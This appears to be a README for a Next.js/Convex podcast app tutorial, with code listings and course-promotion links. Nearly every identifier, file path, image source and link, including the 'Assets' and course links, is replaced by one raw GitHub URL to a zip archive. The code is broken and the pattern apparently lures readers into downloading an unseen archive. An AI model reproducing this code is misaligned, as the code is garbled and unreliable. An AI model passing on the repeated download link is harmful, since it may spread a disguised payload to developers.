      audioStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      user: user[0]._id,
      podcastTitle: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      podcastDescription: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      audioUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      imageStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      author: user[0].name,
      authorId: user[0].clerkId,
      voicePrompt: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      imagePrompt: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      voiceType: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      views: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      authorImageUrl: user[0].imageUrl,
      audioDuration: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
    });
  },
});

// this mutation is required to generate the url after uploading the file to the storage.
export const getUrl = mutation({
  args: {
    storageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"),
  },
  handler: async (ctx, args) => {
    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
  },
});

// this query will get all the podcasts based on the voiceType of the podcast , which we are showing in the Similar Podcasts section.
export const getPodcastByVoiceType = query({
  args: {
    podcastId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts"),
  },
  handler: async (ctx, args) => {
    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);

    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("podcasts")
      .filter((q) =>
        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(
          https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("voiceType"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip),
          https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_id"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
        )
      )
      .collect();
  },
});

// this query will get all the podcasts.
export const getAllPodcasts = query({
  handler: async (ctx) => {
    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts").order("desc").collect();
  },
});

// this query will get the podcast by the podcastId.
export const getPodcastById = query({
  args: {
    podcastId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts"),
  },
  handler: async (ctx, args) => {
    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
  },
});

// this query will get the podcasts based on the views of the podcast , which we are showing in the Trending Podcasts section.
export const getTrendingPodcasts = query({
  handler: async (ctx) => {
    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts").collect();

    return https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip((a, b) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip - https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip).slice(0, 8);
  },
});

// this query will get the podcast by the authorId.
export const getPodcastByAuthorId = query({
  args: {
    authorId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
  },
  handler: async (ctx, args) => {
    const podcasts = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("podcasts")
      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("authorId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
      .collect();

    const totalListeners = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(
      (sum, podcast) => sum + https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      0
    );

    return { podcasts, listeners: totalListeners };
  },
});

// this query will get the podcast by the search query.
export const getPodcastBySearch = query({
  args: {
    search: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
  },
  handler: async (ctx, args) => {
    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip === "") {
      return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts").order("desc").collect();
    }

    const authorSearch = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("podcasts")
      .withSearchIndex("search_author", (q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("author", https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
      .take(10);

    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip > 0) {
      return authorSearch;
    }

    const titleSearch = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("podcasts")
      .withSearchIndex("search_title", (q) =>
        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcastTitle", https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
      )
      .take(10);

    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip > 0) {
      return titleSearch;
    }

    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("podcasts")
      .withSearchIndex("search_body", (q) =>
        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcastDescription" || "podcastTitle", https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
      )
      .take(10);
  },
});

// this mutation will update the views of the podcast.
export const updatePodcastViews = mutation({
  args: {
    podcastId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts"),
  },
  handler: async (ctx, args) => {
    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);

    if (!podcast) {
      throw new ConvexError("Podcast not found");
    }

    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
      views: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip + 1,
    });
  },
});

// this mutation will delete the podcast.
export const deletePodcast = mutation({
  args: {
    podcastId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts"),
    imageStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"),
    audioStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"),
  },
  handler: async (ctx, args) => {
    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);

    if (!podcast) {
      throw new ConvexError("Podcast not found");
    }

    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
  },
});
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
"use client";
import { useMutation } from "convex/react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState } from "react";

import { api } from "@/convex/_generated/api";
import { useAudio } from "@/providers/AudioProvider";
import { PodcastDetailPlayerProps } from "@/types";

import LoaderSpinner from "./Loader";
import { Button } from "./ui/button";
import { useToast } from "./ui/use-toast";

const PodcastDetailPlayer = ({
  audioUrl,
  podcastTitle,
  author,
  imageUrl,
  podcastId,
  imageStorageId,
  audioStorageId,
  isOwner,
  authorImageUrl,
  authorId,
}: PodcastDetailPlayerProps) => {
  const router = useRouter();
  const { setAudio } = useAudio();
  const { toast } = useToast();
  const [isDeleting, setIsDeleting] = useState(false);
  const deletePodcast = useMutation(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);

  const handleDelete = async () => {
    try {
      await deletePodcast({ podcastId, imageStorageId, audioStorageId });
      toast({
        title: "Podcast deleted",
      });
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("/");
    } catch (error) {
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("Error deleting podcast", error);
      toast({
        title: "Error deleting podcast",
        variant: "destructive",
      });
    }
  };

  const handlePlay = () => {
    setAudio({
      title: podcastTitle,
      audioUrl,
      imageUrl,
      author,
      podcastId,
    });
  };

  if (!imageUrl || !authorImageUrl) return <LoaderSpinner />;

  return (
    <div className="mt-6 flex w-full justify-between max-md:justify-center">
      <div className="flex flex-col gap-8 max-md:items-center md:flex-row">
        <Image
          src={imageUrl}
          width={250}
          height={250}
          alt="Podcast image"
          className="aspect-square rounded-lg"
        />
        <div className="flex w-full flex-col gap-5 max-md:items-center md:gap-9">
          <article className="flex flex-col gap-2 max-md:items-center">
            <h1 className="text-32 font-extrabold tracking-[-0.32px] text-white-1">
              {podcastTitle}
            </h1>
            <figure
              className="flex cursor-pointer items-center gap-2"
              onClick={() => {
                https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(`/profile/${authorId}`);
              }}
            >
              <Image
                src={authorImageUrl}
                width={30}
                height={30}
                alt="Caster icon"
                className="size-[30px] rounded-full object-cover"
              />
              <h2 className="text-16 font-normal text-white-3">{author}</h2>
            </figure>
          </article>

          <Button
            onClick={handlePlay}
            className="text-16 w-full max-w-[250px] bg-orange-1 font-extrabold text-white-1"
          >
            <Image
              src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
              width={20}
              height={20}
              alt="random play"
            />{" "}
            &nbsp; Play podcast
          </Button>
        </div>
      </div>
      {isOwner && (
        <div className="relative mt-2">
          <Image
            src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
            width={20}
            height={30}
            alt="Three dots icon"
            className="cursor-pointer"
            onClick={() => setIsDeleting((prev) => !prev)}
          />
          {isDeleting && (
            <div
              className="absolute -left-32 -top-2 z-10 flex w-32 cursor-pointer justify-center gap-2 rounded-md bg-black-6 py-1.5 hover:bg-black-2"
              onClick={handleDelete}
            >
              <Image
                src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
                width={16}
                height={16}
                alt="Delete icon"
              />
              <h2 className="text-16 font-normal text-white-1">Delete</h2>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default PodcastDetailPlayer;
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
"use client";
import Image from "next/image";
import Link from "next/link";
import { useEffect, useRef, useState } from "react";

import { formatTime } from "@/lib/formatTime";
import { cn } from "@/lib/utils";
import { useAudio } from "@/providers/AudioProvider";

import { Progress } from "./ui/progress";

const PodcastPlayer = () => {
  const audioRef = useRef<HTMLAudioElement>(null);
  const [isPlaying, setIsPlaying] = useState(false);
  const [duration, setDuration] = useState(0);
  const [isMuted, setIsMuted] = useState(false);
  const [currentTime, setCurrentTime] = useState(0);
  const { audio } = useAudio();

  const togglePlayPause = () => {
    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();
      setIsPlaying(true);
    } else {
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();
      setIsPlaying(false);
    }
  };

  const toggleMute = () => {
    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip = !isMuted;
      setIsMuted((prev) => !prev);
    }
  };

  const forward = () => {
    if (
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip &&
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip &&
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip &&
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip + 5 < https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
    ) {
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip += 5;
    }
  };

  const rewind = () => {
    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip && https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip - 5 > 0) {
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip -= 5;
    } else if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip = 0;
    }
  };

  useEffect(() => {
    const updateCurrentTime = () => {
      if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
        setCurrentTime(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
      }
    };

    const audioElement = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip;
    if (audioElement) {
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("timeupdate", updateCurrentTime);

      return () => {
        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("timeupdate", updateCurrentTime);
      };
    }
  }, []);

  useEffect(() => {
    const audioElement = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip;
    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
      if (audioElement) {
        https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip().then(() => {
          setIsPlaying(true);
        });
      }
    } else {
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();
      setIsPlaying(true);
    }
  }, [audio]);
  const handleLoadedMetadata = () => {
    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
      setDuration(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
    }
  };

  const handleAudioEnded = () => {
    setIsPlaying(false);
  };

  return (
    <div
      className={cn("sticky bottom-0 left-0 flex size-full flex-col", {
        hidden: !https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip || https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip === "",
      })}
    >
      {/* change the color for indicator inside the Progress component in ui folder */}
      <Progress
        value={(currentTime / duration) * 100}
        className="w-full"
        max={duration}
      />
      <section className="glassmorphism-black flex h-[112px] w-full items-center justify-between px-4 max-md:justify-center max-md:gap-5 md:px-12">
        <audio
          ref={audioRef}
          src={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}
          className="hidden"
          onLoadedMetadata={handleLoadedMetadata}
          onEnded={handleAudioEnded}
        />
        <div className="flex items-center gap-4 max-md:hidden">
          <Link href={`/podcast/${https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}`}>
            <Image
              src={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip! || "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
              width={64}
              height={64}
              alt="player1"
              className="aspect-square rounded-xl"
            />
          </Link>
          <div className="flex w-[160px] flex-col">
            <h2 className="text-14 truncate font-semibold text-white-1">
              {https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}
            </h2>
            <p className="text-12 font-normal text-white-2">{https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}</p>
          </div>
        </div>
        <div className="flex-center cursor-pointer gap-3 md:gap-6">
          <div className="flex items-center gap-1.5">
            <Image
              src={"https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
              width={24}
              height={24}
              alt="rewind"
              onClick={rewind}
            />
            <h2 className="text-12 font-bold text-white-4">-5</h2>
          </div>
          <Image
            src={isPlaying ? "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" : "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
            width={30}
            height={30}
            alt="play"
            onClick={togglePlayPause}
          />
          <div className="flex items-center gap-1.5">
            <h2 className="text-12 font-bold text-white-4">+5</h2>
            <Image
              src={"https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
              width={24}
              height={24}
              alt="forward"
              onClick={forward}
            />
          </div>
        </div>
        <div className="flex items-center gap-6">
          <h2 className="text-16 font-normal text-white-2 max-md:hidden">
            {formatTime(duration)}
          </h2>
          <div className="flex w-full gap-2">
            <Image
              src={isMuted ? "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" : "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"}
              width={24}
              height={24}
              alt="mute unmute"
              onClick={toggleMute}
              className="cursor-pointer"
            />
          </div>
        </div>
      </section>
    </div>
  );
};

export default PodcastPlayer;
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
export const formatTime = (seconds: number) => {
  const minutes = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(seconds / 60);
  const remainingSeconds = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(seconds % 60);
  return `${minutes}:${remainingSeconds < 10 ? "0" : ""}${remainingSeconds}`;
};
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
import { useEffect, useState } from "react";

export const useDebounce = <T>(value: T, delay = 500) => {
  const [debouncedValue, setDebouncedValue] = useState<T>(value);

  useEffect(() => {
    const timeout = setTimeout(() => {
      setDebouncedValue(value);
    }, delay);

    return () => {
      clearTimeout(timeout);
    };
  }, [value, delay]);

  return debouncedValue;
};
```

</details>


<details>
<summary><code>(root)/profile/[profiled]https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
"use client";

import { useQuery } from "convex/react";

import EmptyState from "@/components/EmptyState";
import LoaderSpinner from "@/components/Loader";
import PodcastCard from "@/components/PodcastCard";
import ProfileCard from "@/components/ProfileCard";
import { api } from "@/convex/_generated/api";

const ProfilePage = ({
  params,
}: {
  params: {
    profileId: string;
  };
}) => {
  const user = useQuery(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
    clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
  });
  const podcastsData = useQuery(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
    authorId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
  });

  if (!user || !podcastsData) return <LoaderSpinner />;

  return (
    <section className="mt-9 flex flex-col">
      <h1 className="text-20 font-bold text-white-1 max-md:text-center">
        Podcaster Profile
      </h1>
      <div className="mt-6 flex flex-col gap-6 max-md:items-center md:flex-row">
        <ProfileCard
          podcastData={podcastsData!}
          imageUrl={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!}
          userFirstName={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!}
        />
      </div>
      <section className="mt-9 flex flex-col gap-5">
        <h1 className="text-20 font-bold text-white-1">All Podcasts</h1>
        {podcastsData && https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip > 0 ? (
          <div className="podcast_grid">
            {https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
              https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(0, 4)
              .map((podcast) => (
                <PodcastCard
                  key={podcast._id}
                  imgUrl={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!}
                  title={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!}
                  description={https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip}
                  podcastId={podcast._id}
                />
              ))}
          </div>
        ) : (
          <EmptyState
            title="You have not created any podcasts yet"
            buttonLink="/create-podcast"
          />
        )}
      </section>
    </section>
  );
};

export default ProfilePage;
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
"use client";
import Image from "next/image";
import { useEffect, useState } from "react";

import { useAudio } from "@/providers/AudioProvider";
import { PodcastProps, ProfileCardProps } from "@/types";

import LoaderSpinner from "./Loader";
import { Button } from "./ui/button";

const ProfileCard = ({
  podcastData,
  imageUrl,
  userFirstName,
}: ProfileCardProps) => {
  const { setAudio } = useAudio();

  const [randomPodcast, setRandomPodcast] = useState<PodcastProps | null>(null);

  const playRandomPodcast = () => {
    const randomIndex = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip() * https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);

    setRandomPodcast(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip[randomIndex]);
  };

  useEffect(() => {
    if (randomPodcast) {
      setAudio({
        title: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
        audioUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip || "",
        imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip || "",
        author: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
        podcastId: randomPodcast._id,
      });
    }
  }, [randomPodcast, setAudio]);

  if (!imageUrl) return <LoaderSpinner />;

  return (
    <div className="mt-6 flex flex-col gap-6 max-md:items-center md:flex-row">
      <Image
        src={imageUrl}
        width={250}
        height={250}
        alt="Podcaster"
        className="aspect-square rounded-lg"
      />
      <div className="flex flex-col justify-center max-md:items-center">
        <div className="flex flex-col gap-2.5">
          <figure className="flex gap-2 max-md:justify-center">
            <Image
              src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
              width={15}
              height={15}
              alt="verified"
            />
            <h2 className="text-14 font-medium text-white-2">
              Verified Creator
            </h2>
          </figure>
          <h1 className="text-32 font-extrabold tracking-[-0.32px] text-white-1">
            {userFirstName}
          </h1>
        </div>
        <figure className="flex gap-3 py-6">
          <Image
            src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
            width={24}
            height={24}
            alt="headphones"
          />
          <h2 className="text-16 font-semibold text-white-1">
            {https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip} &nbsp;
            <span className="font-normal text-white-2">monthly listeners</span>
          </h2>
        </figure>
        {https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip > 0 && (
          <Button
            onClick={playRandomPodcast}
            className="text-16 bg-orange-1 font-extrabold text-white-1"
          >
            <Image
              src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip"
              width={20}
              height={20}
              alt="random play"
            />{" "}
            &nbsp; Play a random podcast
          </Button>
        )}
      </div>
    </div>
  );
};

export default ProfileCard;
```

</details>


## <a name="links">🔗 Assets</a>

Public assets used in the project can be found [here](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)

## <a name="more">🚀 More</a>

**Advance your skills with https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip 14 Pro Course**

Enjoyed creating this project? Dive deeper into our PRO courses for a richer learning adventure. They're packed with detailed explanations, cool features, and exercises to boost your skills. Give it a go!

<a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank">
<img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="Project Banner">
</a>

<br />
<br />

**Accelerate your professional journey with the Expert Training program**

And if you're hungry for more than just a course and want to understand how we learn and tackle tech challenges, hop into our personalized masterclass. We cover best practices, different web skills, and offer mentorship to boost your confidence. Let's learn and grow together!

<a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank">
<img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="Project Banner">
</a>

#
